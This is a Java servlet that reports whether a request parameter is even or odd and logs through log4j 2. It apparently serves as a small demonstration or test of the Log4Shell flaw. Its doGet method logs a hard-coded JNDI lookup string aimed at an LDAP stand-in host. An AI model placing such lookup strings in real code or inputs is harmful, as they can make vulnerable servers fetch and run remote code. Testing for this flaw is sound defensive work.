package Perform;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
//import org.apache.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Servlet implementation class EOCheck
 */
@WebServlet("/EOCheck")
public class EOCheck extends HttpServlet {
	
	//static Logger log = Logger.getLogger(EOCheck.class.getName());
	Logger logger = LogManager.getLogger(EOCheck.class);
	
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public EOCheck() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		response.getWriter().append("Served at: ").append(request.getContextPath());
		response.setContentType("text/html");
		PrintWriter out = null;
		try {
			out=response.getWriter();
			int n = Integer.parseInt(request.getParameter("t1"));
			out.println("<center>");
			if(n%2==0)
				out.println(n + "is even number");
			else
				out.println(n + "is odd number");
		}catch(Exception e){
			out.println("Error: "+e.getMessage());
		}
		logger.error("${jndi:ldap://example.com/z}");
	    //logger.debug("sadsadsadsad");  
	    //log.info("logging works on project2"); 
		
	}

}
